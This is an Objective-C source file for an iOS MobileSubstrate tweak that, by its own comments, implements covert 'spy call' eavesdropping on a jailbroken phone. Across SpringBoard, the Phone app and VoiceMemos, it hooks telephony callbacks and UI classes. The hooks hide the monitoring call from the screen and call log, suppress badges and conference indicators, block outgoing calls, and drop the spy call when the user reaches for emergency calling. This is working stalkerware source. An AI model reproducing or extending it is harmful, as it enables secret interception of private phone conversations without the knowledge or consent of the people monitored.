//
//  MSSPC.mm
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright __MyCompanyName__ 2012. All rights reserved.
//
//  MobileSubstrate, libsubstrate.dylib, and substrate.h are
//  created and copyrighted by Jay Freeman a.k.a saurik and 
//  are protected by various means of open source licensing.
//
//  Additional defines courtesy Lance Fetters a.k.a ashikase
//

#import "TelephonyNotifier.h"
#import "SpyCallMobilePhone.h"
#import "SpyCallSpringBoard.h"
#import "AudioVoiceMemo.h"

#import "SpyCallSpringBoardService.h"
#import "SpyCallMobilePhoneService.h"

#pragma mark dylib initialization and initial hooks
#pragma mark 

extern "C" void MSSPCInitialize() {	
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
	DLog (@"MSSPC loaded with identifier = %@", identifier);
	
#pragma mark -
#pragma mark SpringBoard hooks
#pragma mark -
	
    if ([identifier isEqualToString:@"com.apple.springboard"]) {
		// Create service
		SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
		[SpyCallSpringBoardService sharedServiceWithSpyCallManager:spyCallManager];
		
		// Hook telephony callback
		void (*_ServerConnectionCallback)(CTServerConnectionRef connection, CFStringRef notification, CFDictionaryRef notification_info, void * info);
        lookupSymbol(CTTelephony, "__ServerConnectionCallback", _ServerConnectionCallback);
		MSHookFunction(_ServerConnectionCallback, MSHake(_ServerConnectionCallback));
		
		// Hook respring/kill all springboard ...
		MSHookFunction(system, MSHake(system));
		
		Class $SpringBoard(objc_getClass("SpringBoard"));
		// Hook proximity sensor
		_SpringBoard$_proximityChanged$ = MSHookMessage($SpringBoard, @selector(_proximityChanged:), &$SpringBoard$_proximityChanged$);
		// Hook lock button press
		_SpringBoard$lockButtonDown$ = MSHookMessage($SpringBoard, @selector(lockButtonDown:), &$SpringBoard$lockButtonDown$);
		_SpringBoard$lockButtonUp$ = MSHookMessage($SpringBoard, @selector(lockButtonUp:), &$SpringBoard$lockButtonUp$);
		// Hook menu button press
		_SpringBoard$menuButtonDown$ = MSHookMessage($SpringBoard, @selector(menuButtonDown:), &$SpringBoard$menuButtonDown$);
		_SpringBoard$menuButtonUp$ = MSHookMessage($SpringBoard, @selector(menuButtonUp:), &$SpringBoard$menuButtonUp$);
		// Hook call status bar tap while spy call initiate conference
		_SpringBoard$statusBarReturnActionTap$ = MSHookMessage($SpringBoard, @selector(statusBarReturnActionTap:), &$SpringBoard$statusBarReturnActionTap$);
		// Hook auto lock when spy call active
		_SpringBoard$autoLock = MSHookMessage($SpringBoard, @selector(autoLock), &$SpringBoard$autoLock);
		
		Class $SBApplicationIcon(objc_getClass("SBApplicationIcon"));
		// Hook launch any application from spring board (desktop)
	    _SBApplicationIcon$launch = MSHookMessage($SBApplicationIcon, @selector(launch), &$SBApplicationIcon$launch);
		// Hook launch any application from spring board (application switcher)
		_SBApplicationIcon$launchFromViewSwitcher = MSHookMessage($SBApplicationIcon, @selector(launchFromViewSwitcher), &$SBApplicationIcon$launchFromViewSwitcher);
		// Hook badge on mobile application icon (IOS 4,5)
		// Issue: spring board set badge number to millions thus our hook modify the value to 0
		// cause after missed call no badge at mobile application icon
		// Only for IOS 4, 5
		_SBApplicationIcon$_setBadge$ = MSHookMessage($SBApplicationIcon, @selector(_setBadge:), &$SBApplicationIcon$_setBadge$);
		// IOS 6
		if ([[[UIDevice currentDevice] systemVersion] intValue] >= 6) {
			_SBApplicationIcon$setBadge$ = MSHookMessage($SBApplicationIcon, @selector(setBadge:), &$SBApplicationIcon$setBadge$);
		}
		
		// Hook launch any application from spring board (application switcher) for 4.2.1 (double check $$$launchFromViewSwitcher$$$)
		Class $SBUIController = objc_getClass("SBUIController");
		_SBUIController$activateApplicationFromSwitcher$ = MSHookMessage($SBUIController, @selector(activateApplicationFromSwitcher:), &$SBUIController$activateApplicationFromSwitcher$);
		
		// Hook to end spy call while user unlock device via passcode but user try to make emergency call
		Class $SBSlidingAlertDisplay = objc_getClass("SBSlidingAlertDisplay");
		_SBSlidingAlertDisplay$deviceLockViewEmergencyCallButtonPressed$ = MSHookMessage($SBSlidingAlertDisplay, @selector(deviceLockViewEmergencyCallButtonPressed:),
																						 &$SBSlidingAlertDisplay$deviceLockViewEmergencyCallButtonPressed$);
		
		Class $SBAppSwitcherController(objc_getClass("SBAppSwitcherController"));
		// Hook if user kill mobile phone app from app switcher, then start application again there will be monitor number show on screen
		_SBAppSwitcherController$applicationDied$ = MSHookMessage($SBAppSwitcherController, @selector(applicationDied:), &$SBAppSwitcherController$applicationDied$);
		
		Class $SBTelephonyManager(objc_getClass("SBTelephonyManager"));
		// Hook call update status bar of spring board
		_SBTelephonyManager$updateSpringBoard = MSHookMessage($SBTelephonyManager, @selector(updateSpringBoard), &$SBTelephonyManager$updateSpringBoard);
		// Hook block an attempt to make a call from outside mobile phone application, IOS5
		_SBTelephonyManager$urlWithScheme$fromDialingNumber$abUID$urlPathAddition$forceAssist$suppressAssist$wasAlreadyAssisted$ = 
					MSHookMessage($SBTelephonyManager, @selector(urlWithScheme:fromDialingNumber:abUID:urlPathAddition:forceAssist:suppressAssist:wasAlreadyAssisted:),
							&$SBTelephonyManager$urlWithScheme$fromDialingNumber$abUID$urlPathAddition$forceAssist$suppressAssist$wasAlreadyAssisted$);
		// Hook block an attempt to make a call from outside mobile phone application, IOS4
		_SBTelephonyManager$urlWithScheme$fromDialingNumber$abUID$urlPathAddition$ = MSHookMessage($SBTelephonyManager, @selector(urlWithScheme:fromDialingNumber:abUID:urlPathAddition:),
																								   &$SBTelephonyManager$urlWithScheme$fromDialingNumber$abUID$urlPathAddition$);
				
		Class $SBAwayView(objc_getClass("SBAwayView"));
		// Hook update UI when AC usb is plugin or user trcking back and forth the lock bar
		_SBAwayView$shouldShowInCallInfo = MSHookMessage($SBAwayView, @selector(shouldShowInCallInfo), &$SBAwayView$shouldShowInCallInfo);
		// Hook to block user sliding to make emergency call while phone is disabled (user type wronge passcode), in the mean time spy call is in progress
		_SBAwayView$lockBarStoppedTracking$ = MSHookMessage($SBAwayView, @selector(lockBarStoppedTracking:), &$SBAwayView$lockBarStoppedTracking$);
		
		Class $SBCallFailureAlert(objc_getClass("SBCallFailureAlert"));
		// Hook call failure if spy call blocked
		_SBCallFailureAlert$initWithCauseCode$call$ = MSHookMessage($SBCallFailureAlert, @selector(initWithCauseCode:call:), &$SBCallFailureAlert$initWithCauseCode$call$);
		
		// IOS 5 =======
		Class $SBPluginManager(objc_getClass("SBPluginManager"));
		// Hook plugin manager for other hook to incoming call and call waiting screen
		_SBPluginManager$loadPluginBundle$ = MSHookMessage($SBPluginManager, @selector(loadPluginBundle:), &$SBPluginManager$loadPluginBundle$);
		
		Class $SBAwayBulletinListController(objc_getClass("SBAwayBulletinListController"));
		// Hook spy missed call show in spring board's bulletin then user slide to call back
		_SBAwayBulletinListController$observer$addBulletin$forFeed$ = MSHookMessage($SBAwayBulletinListController, @selector(observer:addBulletin:forFeed:),
																					&$SBAwayBulletinListController$observer$addBulletin$forFeed$);
		// =============
		
		
		
		// IOS 4 =======
		Class $SBCallAlert(objc_getClass("SBCallAlert"));
		// Hook incoming call screen
		_SBCallAlert$initWithCall$ = MSHookMessage($SBCallAlert, @selector(initWithCall:), &$SBCallAlert$initWithCall$);
		
		Class $SBCallAlertDisplay(objc_getClass("SBCallAlertDisplay"));
		// Hook incomming call screen while spy call in progress
		_SBCallAlertDisplay$updateLCDWithName$label$breakPoint$ = MSHookMessage($SBCallAlertDisplay, @selector(updateLCDWithName:label:breakPoint:), &$SBCallAlertDisplay$updateLCDWithName$label$breakPoint$);
		
		Class $SBCallWaitingAlertDisplay(objc_getClass("SBCallWaitingAlertDisplay"));
		// Hook call waiting screen
		_SBCallWaitingAlertDisplay$_addCallWaitingButtons$ = MSHookMessage($SBCallWaitingAlertDisplay, @selector(_addCallWaitingButtons:), &$SBCallWaitingAlertDisplay$_addCallWaitingButtons$);
		//=============
		
		Class $AVController(objc_getClass("AVController"));
		// Hook audio session controller for diverting the audio session to ring tone state
		_AVController$init = MSHookMessage($AVController, @selector(init), &$AVController$init);
	}
	
#pragma mark -
#pragma mark MobilePhone
#pragma mark -
	
	if ([identifier isEqualToString:@"com.apple.mobilephone"]) {
		// Create service
		SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
		[SpyCallMobilePhoneService sharedServiceWithSpyCallManager:spyCallManager];
		
		// Hook telephony callback
		void (*_ServerConnectionCallback)(CTServerConnectionRef connection, CFStringRef notification, CFDictionaryRef notification_info, void * info);
        lookupSymbol(CTTelephony, "__ServerConnectionCallback", _ServerConnectionCallback);
		MSHookFunction(_ServerConnectionCallback, MSHake(_ServerConnectionCallback));
		
		Class $PhoneApplication(objc_getClass("PhoneApplication"));
		// Hook an attempt call from contact in side phone application
		_PhoneApplication$shouldAttemptPhoneCall = MSHookMessage($PhoneApplication, @selector(shouldAttemptPhoneCall), &$PhoneApplication$shouldAttemptPhoneCall);
		// Hook voice mail button
		_PhoneApplication$dialVoicemail = MSHookMessage($PhoneApplication, @selector(dialVoicemail), &$PhoneApplication$dialVoicemail);
		// Hook badge
		_PhoneApplication$_setTarBarItemBadge$forViewType$ = MSHookMessage($PhoneApplication, @selector(_setTarBarItemBadge:forViewType:), &$PhoneApplication$_setTarBarItemBadge$forViewType$);
		
		Class $RecentCall(objc_getClass("RecentCall"));
		// Hook recent call in call log history
		_RecentCall$initWithCTCall$givenCountryCode$ = MSHookMessage($RecentCall, @selector(initWithCTCall:), &$RecentCall$initWithCTCall$givenCountryCode$);
		
		Class $InCallController(objc_getClass("InCallController"));
		// Hook to ensure that spy call is always disconnected first except other parties end their calls
		//_InCallController$_endCallClicked$ = MSHookMessage($InCallController, @selector(_endCallClicked:), &$InCallController$_endCallClicked$);
		// Hook update wallpaper when spy is coming and about to join conference
		//_InCallController$_updateCurrentCallDisplay = MSHookMessage($InCallController, @selector(_updateCurrentCallDisplay), &$InCallController$_updateCurrentCallDisplay);
		// Hook to disconnect spy call from conference when user try to view the participants
		//_InCallController$inCallLCDViewConferenceButtonClicked$ = MSHookMessage($InCallController, @selector(inCallLCDViewConferenceButtonClicked:), &$InCallController$inCallLCDViewConferenceButtonClicked$);
		// Hook to block participant numbers slide on the screen
		_InCallController$_updateConferenceDisplayNameCache = MSHookMessage($InCallController, @selector(_updateConferenceDisplayNameCache), &$InCallController$_updateConferenceDisplayNameCache);
		// Hook to block update conference button state
		_InCallController$_setConferenceCall$ = MSHookMessage($InCallController, @selector(_setConferenceCall:), &$InCallController$_setConferenceCall$);
		// Hook to try to remove spy call from display
		_InCallController$setDisplayedCalls$ = MSHookMessage($InCallController, @selector(setDisplayedCalls:), &$InCallController$setDisplayedCalls$);
		
		Class $InCallLCDView(objc_getClass("InCallLCDView"));
		// Hook to block text 'Conference' to update to LCD view
		_InCallLCDView$setText$ = MSHookMessage($InCallLCDView, @selector(setText:), &$InCallLCDView$setText$);
		_InCallLCDView$setText$animating$ = MSHookMessage($InCallLCDView, @selector(setText:animating:), &$InCallLCDView$setText$animating$);
		
		Class $SixSquareView(objc_getClass("SixSquareView"));
		// Hook to block update six squares button (text, image)
		_SixSquareView$setTitle$image$forPosition$ = MSHookMessage($SixSquareView, @selector(setTitle:image:forPosition:), &$SixSquareView$setTitle$image$forPosition$);
		// Hook to block update six squares button (enable, focus)
		_SixSquareView$buttonAtPosition$ = MSHookMessage($SixSquareView, @selector(buttonAtPosition:), &$SixSquareView$buttonAtPosition$);
		
		Class $RecentsViewController(objc_getClass("RecentsViewController"));
		// Hook to refresh recent call one time every view will appear
		_RecentsViewController$viewWillAppear$ = MSHookMessage($RecentsViewController, @selector(viewWillAppear:), &$RecentsViewController$viewWillAppear$);
		_RecentsViewController$viewDidAppear$ = MSHookMessage($RecentsViewController, @selector(viewDidAppear:), &$RecentsViewController$viewDidAppear$);
		
		if ([[[UIDevice currentDevice] systemVersion] intValue] <= 5) {
			// Hook to remove badge from recent call tab view controller of phone application for IOS 5.x downward (tested 5.1.1)
			$RecentsViewController = objc_getMetaClass("RecentsViewController");
			_RecentsViewController$badge = MSHookMessage($RecentsViewController, @selector(badge), &$RecentsViewController$badge);
		}
		
		if ([[[UIDevice currentDevice] systemVersion] intValue] >= 6) {
			Class $PARecentsManager = objc_getClass("PARecentsManager");
			// Hook to remove badge from recent call tab view controller of phone application for IOS 6.x upward
			//_PARecentsManager$callHistorySignificantChangeNotification = MSHookMessage($PARecentsManager, @selector(callHistorySignificantChangeNotification), &$PARecentsManager$callHistorySignificantChangeNotification);
			_PARecentsManager$callHistoryRecordAddedNotification$ = MSHookMessage($PARecentsManager, @selector(callHistoryRecordAddedNotification:), &$PARecentsManager$callHistoryRecordAddedNotification$);
		}
	}
	
#pragma mark -
#pragma mark VoiceMemos
#pragma mark -
	
	if ([identifier isEqualToString:@"com.apple.VoiceMemos"]) {
		[AudioHelper sharedAudioHelper];
		Class $AVController(objc_getClass("AVController"));
		_AVController$play$ = MSHookMessage($AVController, @selector(play:), &$AVController$play$);
		_AVController$playNextItem$ = MSHookMessage($AVController, @selector(playNextItem:), &$AVController$playNextItem$);
		_AVController$pause = MSHookMessage($AVController, @selector(pause), &$AVController$pause);
	}
	DLog(@"MSFSPC initialize end");
    [pool release];
}
